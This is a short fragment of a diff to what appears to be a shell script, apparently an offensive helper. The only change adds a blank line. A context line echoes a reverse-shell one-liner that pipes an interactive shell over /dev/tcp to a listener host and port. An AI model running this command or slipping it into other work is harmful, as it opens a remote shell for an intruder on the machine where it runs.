@@ -32,3 +32,4 @@ echo -e "${GREY}(sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1 & disown)
 done
 
 "
+
